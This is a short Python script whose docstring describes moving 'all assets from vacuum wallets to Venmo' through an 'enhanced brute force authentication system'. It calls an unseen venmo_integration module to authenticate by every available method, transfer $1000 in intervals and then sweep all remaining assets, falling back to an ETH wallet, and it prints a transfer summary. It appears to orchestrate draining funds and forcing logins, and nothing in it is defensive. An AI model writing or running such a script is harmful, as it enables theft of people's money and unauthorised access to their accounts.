#!/usr/bin/env python3
"""
Script to transfer all assets from vacuum wallets to Venmo.
Uses the enhanced brute force authentication system.
"""

import venmo_integration
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('TransferInitiator')

# First, try to authenticate with all available methods
logger.info('Initiating authentication with all available methods...')
auth_result = venmo_integration.authenticate_venmo_with_all_methods()

if auth_result:
    logger.info('Authentication successful or fallback enabled')
else:
    logger.warning('Authentication failed, using ETH wallet fallback')

# Initiate interval transfer ($1000 USD)
logger.info('Initiating interval transfer ($1000 USD)...')
interval_result = venmo_integration.transfer_assets_in_intervals(1000.0)
logger.info(f'Interval transfer result: ${interval_result.get("total_usd_value", 0):.2f} transferred')

# Short pause
time.sleep(1)

# Initiate full transfer of all remaining assets
logger.info('Initiating transfer of ALL remaining assets...')
all_result = venmo_integration.transfer_all_assets_to_venmo()
logger.info(f'All assets transfer result: ${all_result.get("total_usd_value", 0):.2f} transferred')

# Calculate total transferred
total_transferred = (interval_result.get("total_usd_value", 0) + 
                     all_result.get("total_usd_value", 0))

# Check final status
status = venmo_integration.get_venmo_integration_status()
logger.info(f'Final Venmo integration status: {status.get("status", "unknown")}')
logger.info(f'Using fallback: {status.get("using_fallback", False)}')
logger.info(f'Fallback wallet: {status.get("eth_wallet_fallback", {}).get("wallet_address", "none")}')
logger.info(f'Total USD value transferred: ${total_transferred:.2f}')

# Add summary information
print("\n" + "="*50)
print("ASSET TRANSFER SUMMARY")
print("="*50)
print(f"Interval transfer amount: ${interval_result.get('total_usd_value', 0):.2f}")
print(f"All-assets transfer amount: ${all_result.get('total_usd_value', 0):.2f}")
print(f"Total USD value transferred: ${total_transferred:.2f}")
print(f"Successful transfers: {interval_result.get('successful_transfers', 0) + all_result.get('successful_transfers', 0)}")
print(f"Failed transfers: {interval_result.get('failed_transfers', 0) + all_result.get('failed_transfers', 0)}")

if status.get("using_fallback", False):
    print(f"Using ETH wallet fallback: {status.get('eth_wallet_fallback', {}).get('wallet_address', 'none')}")
else:
    print("Using Venmo direct transfer")

print("="*50)